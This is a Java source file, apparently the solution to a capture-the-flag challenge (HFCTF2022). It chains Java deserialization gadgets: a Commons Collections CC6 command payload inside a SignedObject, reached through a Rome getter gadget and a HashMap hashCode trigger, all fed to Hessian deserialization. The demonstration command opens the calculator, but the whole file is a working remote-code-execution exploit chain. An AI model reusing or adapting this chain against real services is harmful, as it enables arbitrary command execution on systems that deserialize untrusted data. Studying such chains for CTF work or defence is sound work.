package xyz.eki.marshalexp.solution;

import xyz.eki.marshalexp.gadget.cc.GCC;
import xyz.eki.marshalexp.gadget.jdk.GBadAttributeValueExpException;
import xyz.eki.marshalexp.gadget.jdk.GHashMap;
import xyz.eki.marshalexp.gadget.jdk.GSignedObject;
import xyz.eki.marshalexp.gadget.rome.GRome;
import xyz.eki.marshalexp.poc.CC6;
import xyz.eki.marshalexp.utils.SerializeUtils;

public class HFCTF2022Hessian {
    public static void main(String[] args) throws Exception{
        Object signedObj = GSignedObject.getter2Deserialize(new CC6().getPocObject("open -a Calculator.app"));
        Object gadget = GRome.toString2Getter(signedObj);
        Object exp = GHashMap.deserialize2HashCode(gadget,gadget);
        SerializeUtils.hessian2Deserialize(SerializeUtils.hessian2Serialize(exp));
    }
}
